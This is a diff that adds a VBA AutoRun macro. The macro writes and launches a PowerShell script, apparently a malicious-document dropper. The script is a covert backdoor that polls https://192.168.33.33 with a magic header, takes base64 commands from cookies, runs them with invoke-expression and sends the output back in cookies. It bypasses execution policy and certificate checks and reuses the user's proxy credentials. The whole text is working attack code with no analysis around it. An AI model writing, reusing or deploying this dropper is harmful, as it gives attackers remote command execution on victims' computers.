@@ -1,0 +1,48 @@
+Sub AutoRun():
+    ' dump the dropper
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set GuyFile = fso.CreateTextFile("C:\windows\temp\test.ps1", True)
+    GuyFile.WriteLine (" $url = 'https://192.168.33.33'; ")
+    GuyFile.WriteLine (" #Magic header - change as needed for both client and the server")
+    GuyFile.WriteLine (" $m = '737060cd8c284d8af7ad3082f209582d';")
+    GuyFile.WriteLine (" function w ")
+    GuyFile.WriteLine (" { ")
+    GuyFile.WriteLine ("     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; ")
+    GuyFile.WriteLine ("     $r = [System.Net.HttpWebRequest]::Create($url); ")
+    GuyFile.WriteLine ("     $r.Headers.Add('If-Match', $m); ")
+    GuyFile.WriteLine ("     $p = [System.Net.WebRequest]::GetSystemWebProxy(); ")
+    GuyFile.WriteLine ("         # handle credetnails ")
+    GuyFile.WriteLine ("     $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials; ")
+    GuyFile.WriteLine ("     $r.proxy = $proxy; ")
+    GuyFile.WriteLine ("     return $r; ")
+    GuyFile.WriteLine (" } ")
+    GuyFile.WriteLine (" ")
+    GuyFile.WriteLine (" while ($true) ")
+    GuyFile.WriteLine (" { ")
+    GuyFile.WriteLine ("     $r = w; ")
+    GuyFile.WriteLine ("     try { $p = $r.GetResponse(); } catch { continue; } ")
+    GuyFile.WriteLine ("     $x = $p.GetResponseHeader('Set-Cookie'); ")
+    GuyFile.WriteLine ("     if (![string]::IsNullOrEmpty($x)) ")
+    GuyFile.WriteLine ("     { ")
+    GuyFile.WriteLine ("         $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); ")
+    GuyFile.WriteLine ("         #invoke and catch any exceptions ")
+    GuyFile.WriteLine ("                 try { $o = invoke-expression '$c' 2>&1 | Out-String; } ")
+    GuyFile.WriteLine ("         catch { $o = $_.Exception| Out-String; } ")
+    GuyFile.WriteLine ("                 # get output back to the server in cookie ")
+    GuyFile.WriteLine ("         $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o)) ")
+    GuyFile.WriteLine ("         $r = w; ")
+    GuyFile.WriteLine ("         $r.Headers.Add('Cookie', $o); ")
+    GuyFile.WriteLine ("         $r.GetResponse().close(); ")
+    GuyFile.WriteLine ("     } ")
+    GuyFile.WriteLine ("     $p.close(); ")
+    GuyFile.WriteLine (" } ")
+    ' exec the command
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    retVal = Shell("powershell.exe -ExecutionPolicy Bypass -noprofile -noexit C:\windows\temp\test.ps1", vbNormalFocus)
+End Sub
